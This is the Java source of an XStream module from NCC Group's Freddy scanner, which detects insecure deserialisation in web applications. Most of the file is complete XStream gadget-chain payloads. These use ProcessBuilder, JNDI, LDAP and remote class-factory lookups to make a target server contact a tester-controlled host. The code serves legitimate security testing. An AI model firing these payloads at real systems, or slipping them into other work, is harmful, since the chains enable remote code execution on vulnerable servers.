// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java XStream library.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XStreamModule extends FreddyModuleBase {
	//CommonsBeanutils payload data
	private static final String COMBU_PREFIX = "<java.util.PriorityQueue serialization=\"custom\"><unserializable-parents/><java.util.PriorityQueue><default><size>2</size><comparator class=\"org.apache.commons.beanutils.BeanComparator\"><property>databaseMetaData</property><comparator class=\"java.util.Collections$ReverseComparator\"/></comparator></default><int>3</int><com.sun.rowset.JdbcRowSetImpl serialization=\"custom\"><javax.sql.rowset.BaseRowSet><default><concurrency>1008</concurrency><escapeProcessing>true</escapeProcessing><fetchDir>1000</fetchDir><fetchSize>0</fetchSize><isolation>2</isolation><maxFieldSize>0</maxFieldSize><maxRows>0</maxRows><queryTimeout>0</queryTimeout><readOnly>true</readOnly><rowSetType>1004</rowSetType><showDeleted>false</showDeleted><dataSource>";
	private static final String COMBU_SUFFIX = "</dataSource><params/></default></javax.sql.rowset.BaseRowSet><com.sun.rowset.JdbcRowSetImpl><default><iMatchColumns><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int></iMatchColumns><strMatchColumns><string>foo</string><null/><null/><null/><null/><null/><null/><null/><null/><null/></strMatchColumns></default></com.sun.rowset.JdbcRowSetImpl></com.sun.rowset.JdbcRowSetImpl><com.sun.rowset.JdbcRowSetImpl reference=\"../com.sun.rowset.JdbcRowSetImpl\"/></java.util.PriorityQueue></java.util.PriorityQueue>";
	
	//ImageIO payload data
	private static final String IMAGEIO_PREFIX = "<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"><dataHandler><dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"><is class=\"javax.crypto.CipherInputStream\"><cipher class=\"javax.crypto.NullCipher\"><initialized>false</initialized><opmode>0</opmode><serviceIterator class=\"javax.imageio.spi.FilterIterator\"><iter class=\"javax.imageio.spi.FilterIterator\"><iter class=\"java.util.Collections$EmptyIterator\"/><next class=\"java.lang.ProcessBuilder\"><command>";
	private static final String IMAGEIO_SUFFIX = "</command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class=\"javax.imageio.ImageIO$ContainsFilter\"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class=\"string\">foo</next></serviceIterator><lock/></cipher><input class=\"java.lang.ProcessBuilder$NullInputStream\"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/></entry></map>";
	
	//LazySearchEnumeration payload data
	private static final String LSE_PREFIX = "<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"><dataHandler><dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"><is class=\"javax.crypto.CipherInputStream\"><cipher class=\"javax.crypto.NullCipher\"><initialized>false</initialized><opmode>0</opmode><serviceIterator class=\"sun.misc.Service$LazyIterator\"><configs class=\"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\"><candidates class=\"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\"><nextMatch><name>foo</name><isRel>true</isRel><boundObj class=\"javax.naming.spi.ContinuationDirContext\"><cpe><stackTrace/><suppressedExceptions class=\"java.util.Collections$UnmodifiableRandomAccessList\" resolves-to=\"java.util.Collections$UnmodifiableList\"><c class=\"list\"/><list reference=\"../c\"/></suppressedExceptions><resolvedObj class=\"javax.naming.Reference\"><className>Foo</className><addrs/><classFactory>Freddy</classFactory><classFactoryLocation>";
	private static final String LSE_SUFFIX = "</classFactoryLocation></resolvedObj></cpe></boundObj></nextMatch><useFactory>false</useFactory></candidates><cons><searchScope>1</searchScope><timeLimit>0</timeLimit><derefLink>false</derefLink><returnObj>false</returnObj><countLimit>0</countLimit></cons><useFactory>true</useFactory></configs><returned class=\"sorted-set\"/></serviceIterator><lock/></cipher><input class=\"java.lang.ProcessBuilder$NullInputStream\"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/><jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/></entry></map>";
	
	//Resin payload data
	private static final String RESIN_PREFIX = "<map><entry><com.caucho.naming.QName><__context class=\"javax.naming.spi.ContinuationDirContext\"><cpe><stackTrace><trace>marshalsec.gadgets.Resin.makeResinQName(Resin.java:56)</trace><trace>sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</trace><trace>sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)</trace><trace>sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)</trace><trace>java.lang.reflect.Method.invoke(Unknown Source)</trace><trace>marshalsec.MarshallerBase.createObject(MarshallerBase.java:331)</trace><trace>marshalsec.MarshallerBase.doRun(MarshallerBase.java:165)</trace><trace>marshalsec.MarshallerBase.run(MarshallerBase.java:121)</trace><trace>marshalsec.XStream.main(XStream.java:89)</trace></stackTrace><resolvedObj class=\"javax.naming.Reference\"><className>Foo</className><addrs/><classFactory>Freddy</classFactory><classFactoryLocation>";
	private static final String RESIN_SUFFIX = "</classFactoryLocation></resolvedObj></cpe><env/></__context><__items><string>foo</string><string>bar</string></__items></com.caucho.naming.QName><com.caucho.naming.QName reference=\"../com.caucho.naming.QName\"/></entry><entry><com.sun.org.apache.xpath.internal.objects.XString><m__obj class=\"string\">?&#xf;&#x1a;&#xb;</m__obj></com.sun.org.apache.xpath.internal.objects.XString><com.sun.org.apache.xpath.internal.objects.XString reference=\"../com.sun.org.apache.xpath.internal.objects.XString\"/></entry></map>";
	
	//Rome payload data
	private static final String ROME_PREFIX = "<map><entry><com.rometools.rome.feed.impl.EqualsBean><beanClass>com.rometools.rome.feed.impl.ToStringBean</beanClass><obj class=\"com.rometools.rome.feed.impl.ToStringBean\"><beanClass>com.sun.rowset.JdbcRowSetImpl</beanClass><obj class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\"><javax.sql.rowset.BaseRowSet><default><concurrency>1008</concurrency><escapeProcessing>true</escapeProcessing><fetchDir>1000</fetchDir><fetchSize>0</fetchSize><isolation>2</isolation><maxFieldSize>0</maxFieldSize><maxRows>0</maxRows><queryTimeout>0</queryTimeout><readOnly>true</readOnly><rowSetType>1004</rowSetType><showDeleted>false</showDeleted><dataSource>";
	private static final String ROME_SUFFIX = "</dataSource><params/></default></javax.sql.rowset.BaseRowSet><com.sun.rowset.JdbcRowSetImpl><default><iMatchColumns><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int><int>-1</int></iMatchColumns><strMatchColumns><string>foo</string><null/><null/><null/><null/><null/><null/><null/><null/><null/></strMatchColumns></default></com.sun.rowset.JdbcRowSetImpl></obj></obj></com.rometools.rome.feed.impl.EqualsBean><com.rometools.rome.feed.impl.EqualsBean reference=\"../com.rometools.rome.feed.impl.EqualsBean\"/></entry><entry><com.rometools.rome.feed.impl.EqualsBean reference=\"../../entry/com.rometools.rome.feed.impl.EqualsBean\"/><com.rometools.rome.feed.impl.EqualsBean reference=\"../../entry/com.rometools.rome.feed.impl.EqualsBean\"/></entry></map>";
	
	//SpringAbstractBeanFactory payload data
	private static final String SABF_PREFIX = "<map><entry><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=\"custom\"><org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor><default><adviceBeanName>";
	private static final String SABF_MIDDLE = "</adviceBeanName><beanFactory class=\"org.springframework.jndi.support.SimpleJndiBeanFactory\"><logger class=\"org.apache.commons.logging.impl.NoOpLog\"/><jndiTemplate><logger class=\"org.apache.commons.logging.impl.NoOpLog\"/></jndiTemplate><resourceRef>true</resourceRef><shareableResources><string>";
	private static final String SABF_SUFFIX = "</string></shareableResources><singletonObjects/><resourceTypes/></beanFactory></default></org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor><default><pointcut class=\"org.springframework.aop.TruePointcut\"/></default></org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor></org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=\"../org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"/></entry><entry><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=\"custom\"><org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor><default/></org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor><default><pointcut class=\"org.springframework.aop.TruePointcut\" reference=\"../../../../../entry/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor/default/pointcut\"/></default></org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor></org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor><org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=\"../org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\"/></entry></map>";
	
	//SpringPartiallyComparableAdvisor payload data
	private static final String SPCA_PREFIX = "<map><entry><org.springframework.aop.target.HotSwappableTargetSource><target class=\"org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder\"><advisor class=\"org.springframework.aop.aspectj.AspectJPointcutAdvisor\"><advice class=\"org.springframework.aop.aspectj.AspectJAroundAdvice\" serialization=\"custom\"><org.springframework.aop.aspectj.AbstractAspectJAdvice><default><argumentsIntrospected>false</argumentsIntrospected><declarationOrder>0</declarationOrder><joinPointArgumentIndex>0</joinPointArgumentIndex><joinPointStaticPartArgumentIndex>0</joinPointStaticPartArgumentIndex><aspectInstanceFactory class=\"org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory\"><beanFactory class=\"org.springframework.jndi.support.SimpleJndiBeanFactory\"><logger class=\"org.apache.commons.logging.impl.NoOpLog\"/><jndiTemplate><logger class=\"org.apache.commons.logging.impl.NoOpLog\"/></jndiTemplate><resourceRef>true</resourceRef><shareableResources><string>";
	private static final String SPCA_MIDDLE = "</string></shareableResources><singletonObjects/><resourceTypes/></beanFactory><name>";
	private static final String SPCA_SUFFIX = "</name></aspectInstanceFactory><declaringClass>java.lang.Object</declaringClass><methodName>toString</methodName><parameterTypes/></default></org.springframework.aop.aspectj.AbstractAspectJAdvice></advice></advisor></target></org.springframework.aop.target.HotSwappableTargetSource><org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/></entry><entry><org.springframework.aop.target.HotSwappableTargetSource><target class=\"com.sun.org.apache.xpath.internal.objects.XString\"><m__obj class=\"string\">?&#x3;&#x6;&#x6;</m__obj></target></org.springframework.aop.target.HotSwappableTargetSource><org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/></entry></map>";
	
	//XBean payload data
	private static final String XBEAN_PREFIX = "<map><entry><org.springframework.aop.target.HotSwappableTargetSource><target class=\"org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding\"><name>foo</name><isRel>true</isRel><boundObj class=\"javax.naming.Reference\"><className>foo</className><addrs/><classFactory>Freddy</classFactory><classFactoryLocation>";
	private static final String XBEAN_SUFFIX = "</classFactoryLocation></boundObj><value class=\"javax.naming.Reference\" reference=\"../boundObj\"/><context class=\"org.apache.xbean.naming.context.WritableContext\"><modifiable>false</modifiable><cacheReferences>false</cacheReferences><supportReferenceable>false</supportReferenceable><checkDereferenceDifferent>false</checkDereferenceDifferent><assumeDereferenceBound>false</assumeDereferenceBound></context><isRelative>false</isRelative></target></org.springframework.aop.target.HotSwappableTargetSource><org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/></entry><entry><org.springframework.aop.target.HotSwappableTargetSource><target class=\"com.sun.org.apache.xpath.internal.objects.XString\"><m__obj class=\"string\">?&#x1b;&#x14;</m__obj></target></org.springframework.aop.target.HotSwappableTargetSource><org.springframework.aop.target.HotSwappableTargetSource reference=\"../org.springframework.aop.target.HotSwappableTargetSource\"/></entry></map>";
	
	protected void initialiseModule() {
		setName("XStream");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Register passive/active scan payloads
		registerPassiveScanIndicator("com.thoughtworks.xstream.io.StreamException", IndicatorTarget.RESPONSE);
		registerPassiveScanIndicator(new Pattern[] {Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("com\\.thoughtworks\\.xstream\\.")}, IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload("<FreddyDeser/>", "com.thoughtworks.xstream.mapper.CannotResolveClassException");
		
		registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, false);
		registerActiveScanCollaboratorPayload(PN_IMAGEIO, false);
		registerActiveScanCollaboratorPayload(PN_LAZYSEARCH, false);
		registerActiveScanCollaboratorPayload(PN_RESIN, false);
		registerActiveScanCollaboratorPayload(PN_ROME, false);
		registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
		registerActiveScanCollaboratorPayload(PN_SPRINGPCA, false);
		registerActiveScanCollaboratorPayload(PN_XBEAN, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_COMBEANUTILS:
				return COMBU_PREFIX + "ldap://" + hostname + "/" + COMBU_SUFFIX;
				
			case PN_IMAGEIO:
				return IMAGEIO_PREFIX + "<string>nslookup</string><string>" + hostname + "</string>" + IMAGEIO_SUFFIX;
				
			case PN_LAZYSEARCH:
				return LSE_PREFIX + "http://" + hostname + "/" + LSE_SUFFIX;
				
			case PN_RESIN:
				return RESIN_PREFIX + "http://" + hostname + "/" + RESIN_SUFFIX;
				
			case PN_ROME:
				return ROME_PREFIX + "ldap://" + hostname + "/" + ROME_SUFFIX;
				
			case PN_SPRINGABF:
				return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;
				
			case PN_SPRINGPCA:
				return SPCA_PREFIX + "ldap://" + hostname + "/" + SPCA_MIDDLE + "ldap://" + hostname + "/" + SPCA_SUFFIX;
				
			case PN_XBEAN:
				return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
		}
		return null;
	}
}
